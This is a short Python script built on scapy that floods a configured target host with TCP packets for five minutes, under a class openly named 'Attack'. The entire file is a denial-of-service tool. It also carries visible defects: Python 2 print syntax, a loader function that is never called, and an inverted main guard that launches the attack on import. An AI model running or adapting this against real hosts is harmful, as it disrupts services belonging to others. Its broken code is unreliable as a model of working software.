from scapy.layers.inet import IP, TCP, sr
from dotenv import load_dotenv
import os
import signal

def load_env_variables():
    load_dotenv()

class TimeoutException(Exception):
    pass

class Attack:
    def __init__(self):
        self.target = os.getenv("DESTINATION")
        self.packet_type = os.getenv("FLAGS")

    def _create_packet(self):
        ip_format = IP(dst=self.target)
        tcp_format = TCP(flags=self.packet_type)
        build_packet = ip_format / tcp_format
        return build_packet

    def _countdown_handler(self, signum, frame):
        raise TimeoutException
    def attack_target(self, time_in_secs):
        signal.signal(signal.SIGALRM, self._countdown_handler)
        signal.alarm(time_in_secs)
        packet = self._create_packet()
        try:
            while True:
                sr(packet)
        except TimeoutException:
            print "Attack Complete."

if __name__ != '__main__':
    attack_obj = Attack()
    # attack for five minutes
    attack_obj.attack_target(300)
